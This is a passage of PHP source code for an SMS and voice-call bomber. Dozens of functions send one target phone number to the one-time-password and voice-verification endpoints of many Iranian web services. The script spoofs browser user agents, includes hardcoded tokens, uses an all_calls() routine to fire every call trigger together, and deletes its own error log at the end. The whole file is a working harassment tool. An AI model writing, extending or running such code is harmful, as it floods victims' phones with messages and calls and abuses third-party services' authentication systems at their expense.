    $data = json_encode(["mobile" => "0" . $phone]);
    CURL_POST($url, $data);
}

function rokla($phone) {
    $url = "https://api.rokla.ir/api/request/otp";
    $data = json_encode(["mobile" => "0" . $phone]);
    CURL_POST($url, $data);
}

function pezeshket($phone) {
    $url = "https://api.pezeshket.com/core/v1/auth/requestCode";
    $data = json_encode(["mobileNumber" => "0" . $phone]);
    CURL_POST($url, $data);
}

function virgool($phone) {
    $url = "https://virgool.io/api/v1.4/auth/verify";
    $data = json_encode([
        "method" => "phone",
        "identifier" => "0" . $phone
    ]);
    CURL_POST($url, $data);
}

function timcheh($phone) {
    $url = "https://api.timcheh.com/auth/otp/send";
    $data = json_encode(["mobile" => "0" . $phone]);
    CURL_POST($url, $data);
}

function paklean($phone) {
    $url = "https://client.api.paklean.com/user/resendCode";
    $data = json_encode(["username" => "0" . $phone]);
    CURL_POST($url, $data);
}

function daal($phone) {
    $url = "https://daal.co/api/authentication/login-register/method/phone-otp/user-role/customer/verify-request";
    $data = json_encode(["phone" => "0" . $phone]);
    CURL_POST($url, $data);
}

function bimebazar($phone) {
    $url = "https://bimebazar.com/accounts/api/login_sec/";
    $data = json_encode(["username" => "0" . $phone]);
    CURL_POST($url, $data);
}
function safarmarket($phone) {
    $url = "https://safarmarket.com//api/security/v2/user/otp";
    $data = json_encode(["phone" => "0" . $phone]);
    CURL_POST($url, $data);
}




function snappmarket($phone) {
    $url = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0" . $phone;
    $headers = [
        "referer: https://snapp.market/",
        "user-agent: " . generate_user_agent("linux")
    ];
    CURL_POST($url, null, $headers);
}





function okcs($phone) {
    $url = "https://okcs.com/users/mobilelogin?mobile=0" . $phone;
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_GET($url, $headers);
}
function snappdoctor($phone) {
    $url = "https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/" . $phone . "/sms?cCode=+98";
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_GET($url, $headers);
}

function ghasedak24($phone) {
    $url = "https://ghasedak24.com/user/ajax_register";
    $data = json_encode(["username" => "0" . $phone]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}
function iranketab($phone) {
    $url = "https://www.iranketab.ir/account/register";
    $data = json_encode(["UserName" => "0" . $phone]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}

function takfarsh($phone) {
    $url = "https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php";
    $data = json_encode(["phone_email" => "0" . $phone]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}

function iranicard($phone) {
    $url = "https://api.iranicard.ir/api/v1/register";
    $data = json_encode(["mobile" => "0" . $phone]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}
function pubgsell($phone) {
    $url = "https://pubg-sell.ir/loginuser?username=0" . $phone;
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_GET($url, $headers);
}
function tj8($phone) {
    $url = "https://tj8.ir/auth/register";
    $data = json_encode(["mobile" => "0" . $phone]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}

function mashinbank($phone) {
    $url = "https://mashinbank.com/api2/users/check";
    $data = json_encode(["mobileNumber" => "0" . $phone]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}

function cinematicket($phone) {
    $url = "https://cinematicket.org/api/v1/users/signup";
    $data = json_encode(["phone_number" => "0" . $phone]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}

function kafegheymat($phone) {
    $url = "https://kafegheymat.com/shop/getLoginSms";
    $data = json_encode(["phone" => "0" . $phone]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}
function opco($phone) {
    $url = "https://shop.opco.co.ir/index.php?route=extension/module/login_verify/update_register_code";
    $data = json_encode(["telephone" => "0" . $phone]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}
function melix($phone) {
    $url = "https://melix.shop/site/api/v1/user/otp";
    $data = json_encode(["mobile" => "0" . $phone]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}
function safiran($phone) {
    $url = "https://safiran.shop/login";
    $data = json_encode(["mobile" => "0" . $phone]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}
function dastakht($phone) {
    $url = "https://dastkhat-isad.ir/api/v1/user/store";
    $data = json_encode([
        "mobile" => $phone,
        "countryCode" => 98,
        "device_os" => 2
    ]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}
function arshian($phone) {
    $url = "https://api.arshiyan.com/send_code";
    $data = json_encode([
        "country_code" => "98",
        "phone_number" => $phone
    ]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}

function topnoor($phone) {
    $url = "https://backend.topnoor.ir/web/v1/user/otp";
    $data = json_encode(["mobile" => "0" . $phone]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}

function alinance($phone) {
    $url = "https://api.alinance.com/user/register/mobile/send/";
    $data = json_encode(["phone_number" => "0" . $phone]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}



function alopeyksafir($phone) {
    $url = "https://api.alopeyk.com/safir-service/api/v1/login";
    $data = json_encode(["phone" => "0" . $phone]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}
function dosma($phone) {
    $url = "https://app.dosma.ir/sendverify/";
    $data = json_encode(["username" => "0" . $phone]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}

function ehteraman($phone) {
    $url = "https://api.ehteraman.com/api/request/otp";
    $data = json_encode(["mobile" => "0" . $phone]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}

function homtick($phone) {
    $url = "https://auth.homtick.com/api/V1/User/GetVerifyCode";
    $data = json_encode([
        "mobileOrEmail" => "0" . $phone,
        "deviceCode" => "d520c7a8-421b-4563-b955-f5abc56b97ec",
        "firstName" => "",
        "lastName" => "",
        "password" => ""
    ]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}

function iranamlaak($phone) {
    $url = "https://api.iranamlaak.net/authenticate/send/otp/to/mobile/via/sms";
    $data = json_encode(["AgencyMobile" => "0" . $phone]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}

function karchidari($phone) {
    $url = "https://api.kcd.app/api/v1/auth/login";
    $data = json_encode(["mobile" => "0" . $phone]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}

function mazoo($phone) {
    $url = "https://mazoocandle.ir/login";
    $data = json_encode(["phone" => $phone]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}

function paymishe($phone) {
    $url = "https://api.paymishe.com/api/v1/otp/registerOrLogin";
    $data = json_encode(["mobile" => "0" . $phone]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}
function podro($phone) {
    $url = "https://api.paymishe.com/api/v1/otp/registerOrLogin";
    $data = json_encode(["mobile" => "0" . $phone]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}



function amoomilad($phone) {
    $url = "https://amoomilad.demo-hoonammaharat.ir/api/v1.0/Account/Sendcode";
    $data = json_encode([
        "Token" => "5c486f96df46520d1e4d4a998515b1de02392c9b903a7734ec2798ec55be6e5c",
        "DeviceId" => 1,
        "PhoneNumber" => "0" . $phone,
        "Helper" => 77942
    ]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}

function offch($phone) {
    $url = "https://api.offch.com/auth/otp";
    $data = json_encode(["username" => "0" . $phone]);
    $headers = [
        "user-agent: " . generate_user_agent()
    ];
    CURL_POST($url, $data, $headers);
}

// =======================
// توابع جدید برای APIهای تماس
// =======================

function generate_user_agent($os = "win") {
    if($os == "win") {
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36";
    } elseif($os == "android") {
        return "Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36";
    } else {
        return "Mozilla/5.0";
    }
}


function mrbilitcall($phone) {
    $url = 'https://auth.mrbilit.com/api/Token/send/byCall?mobile=' . $phone;
    CURL_GET($url);
}

function tezolmarket($phone) {
    $url = 'https://api.codebazan.ir/adad/?text=' . $phone;
    $response = file_get_contents($url);
    $json = json_decode($response, true);
    $fa = $json["result"]["fa"];
    $persianPhone = "۰" . $fa;
    $url2 = 'https://www.tezolmarket.com/Account/Login?PhoneNumber=' . urlencode($persianPhone) . '&SendCodeProcedure=1';
    CURL_GET($url2);
}

function gap($phone) {
    $num = substr($phone, 1); // حذف صفر اول
    $url = 'https://core.gap.im/v1/user/resendCode.json?mobile=%2B98' . $num . '&type=IVR';
    CURL_GET($url);
}

function novinbook($phone) {
    $url = "https://novinbook.com/index.php?route=account/phone";
    $postData = "phone=" . $phone . "&call=yes";
    $headers = array(
        'accept: */*',
        'accept-encoding: gzip, deflate, br',
        'accept-language: en-US,en;q=0.9',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        'cookie: language=fa; currency=RLS',
        'origin: https://novinbook.com',
        'referer: https://novinbook.com/index.php?route=account/phone',
        'sec-ch-ua: "Google Chrome";v="105", "Not A;Brand";v="8", "Chromium";v="105"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: Windows',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: ' . generate_user_agent("win"),
        'x-requested-with: XMLHttpRequest'
    );
    CURL_POST($url, $postData, $headers);
}

function azki_call($phone) {
    $url = 'https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=' . $phone;
    $headers = array(
        'accept: */*',
        'accept-encoding: gzip, deflate, br',
        'accept-language: en-US,en;q=0.9',
        'device: web',
        'deviceid: 6',
        'referer: https://www.azki.com/',
        'sec-ch-ua: "Google Chrome";v="105", "Not A;Brand";v="8", "Chromium";v="105"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: Windows',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: ' . generate_user_agent("win"),
        'user-name: null',
        'user-token: 2ub07qJQnuG7w1NtXMifm1JeKnKSJzBKnIosaF0FnM8mVfwWAAV4Ae9cMu3JxskL'
    );
    CURL_GET($url, $headers);
}

function trip_call($phone) {
    $url1 = "https://gateway.trip.ir/api/registers";
    $url2 = "https://gateway.trip.ir/api/Totp";
    $headers = array(
        "content-type: application/json;charset=UTF-8",
        "sec-ch-ua: \"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"",
        "accept: application/json, text/plain, */*",
        "accept-language: fa-IR",
        "user-agent: " . generate_user_agent("android"),
        "sec-ch-ua-platform: \"Android\"",
        "origin: https://www.trip.ir",
        "sec-fetch-site: same-site",
        "sec-fetch-mode: cors",
        "sec-fetch-dest: empty",
        "referer: https://www.trip.ir/",
        "accept-encoding: gzip, deflate, br",
        "host: gateway.trip.ir"
    );
    $data1 = json_encode(array("CellPhone" => $phone));
    $data2 = json_encode(array("PhoneNumber" => $phone));
    CURL_POST($url1, $data1, $headers);
    CURL_POST($url2, $data2, $headers);
}

function paklean_call($phone) {
    $url = "https://client.api.paklean.com/user/resendVoiceCode";
    $headers = array(
        "user-agent: " . generate_user_agent()
    );
    $data = json_encode(array("username" => $phone));
    CURL_POST($url, $data, $headers);
}

function ragham_call($phone) {
    $num = substr($phone, 1);
    $url = "https://web.raghamapp.com/api/users/code";
    $headers = array(
        "user-agent: " . generate_user_agent()
    );
    $data = json_encode(array("phone" => "+98" . $num));
    CURL_POST($url, $data, $headers);
}

function all_calls($phone) {
    mrbilitcall($phone);
    tezolmarket($phone);
    gap($phone);
    novinbook($phone);
    azki_call($phone);
    trip_call($phone);
    paklean_call($phone);
    ragham_call($phone);
}

$FileName = "error_log";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fclose($FileHandle);
unlink($FileName);
?>
